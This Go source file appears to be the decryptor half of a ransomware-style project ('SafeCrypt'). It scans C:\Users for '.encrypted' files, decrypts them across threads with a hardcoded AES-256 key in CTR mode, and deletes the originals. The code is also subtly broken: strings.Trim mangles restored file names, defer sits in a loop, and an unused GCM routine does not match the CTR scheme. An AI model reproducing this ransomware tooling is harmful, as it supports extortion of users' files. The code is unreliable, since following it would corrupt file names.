package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"os"
	"strings"
	"sync"

	"SafeCrypt/Explorer"
)

func main() {
	dir := "C:\\Users" // Insert starting directory

	// Example 256-bit key in hexadecimal format (64 hex characters)
	hexKey := "fc906fec889057c1b12a253855430ba72e5e9d5940f09615387b4a74e51fa1ab"

	key, err := hex.DecodeString(hexKey)
	if err != nil {
		panic(err)

	}

	files := Explorer.MapFiles(dir)

	var fixed_files []string

	for _, v := range files {
		if !strings.HasSuffix(v, ".encrypted") {
			continue

		}
		fixed_files = append(fixed_files, v)

	}

	num_of_threads, num_of_files_per_thread, num_of_threads_to_add_extra_files := Explorer.CalcThreads(fixed_files)

	var wg sync.WaitGroup

	wg.Add(num_of_threads)
	num_of_files_to_add_thread := 0

	for i := 0; i < num_of_threads; i++ {

		if i < num_of_threads_to_add_extra_files {
			num_of_files_to_add_thread = num_of_files_per_thread + 1

		} else {
			num_of_files_to_add_thread = num_of_files_per_thread
		}

		files_of_thread := fixed_files[:num_of_files_to_add_thread]

		go func() {
			defer wg.Done()
			RunWG(files_of_thread, key)

		}()

		fixed_files = fixed_files[num_of_files_to_add_thread:]

	}

	wg.Wait()

}

func Decrypt(ciphertext []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	// Extract the IV from the ciphertext
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, errors.New("ciphertext too short ")
	}
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]

	// Decrypt the ciphertext
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

func isDirectory(path string) bool {
	info, err := os.Stat(path)
	if err != nil {
		// handle error, e.g. file not found
		return false
	}
	return info.IsDir()
}

func RunWG(files_of_thread []string, key []byte) {

	for _, v := range files_of_thread {

		if isDirectory(v) {
			continue
		}

		hFile, err := os.Stat(v)
		if err != nil {
			continue
		}

		if hFile.Size() == 0 {
			continue
		}

		// fmt.Println("Decrypting file", v)
		inFile, err := os.Open(v)
		if err != nil {
			continue
		}
		defer inFile.Close()

		dst, err := os.Create(strings.Trim(v, ".encrypted"))
		if err != nil {
			continue
		}

		// Read the Initialization Vector (iv) from the first block of inFile
		iv := make([]byte, aes.BlockSize)
		if _, err := io.ReadFull(inFile, iv); err != nil {
			continue
		}

		// Create a 128 bits cipher.Block for AES-256
		block, err := aes.NewCipher(key)
		if err != nil {
			continue
		}

		// Get a stream for decrypting in counter mode
		stream := cipher.NewCTR(block, iv)

		// Open a stream to decrypt the input file and write to dst
		reader := &cipher.StreamReader{S: stream, R: inFile}

		// Copy the decrypted data to dst
		if _, err := io.Copy(dst, reader); err != nil {
			continue
		}

		dst.Close()

		err = inFile.Close()
		if err != nil {
			fmt.Println("error closing file! ", v)
			continue
		}

		err = os.Remove(v)
		if err != nil {
			fmt.Println("error deleting file! ", v)
		}

	}
}
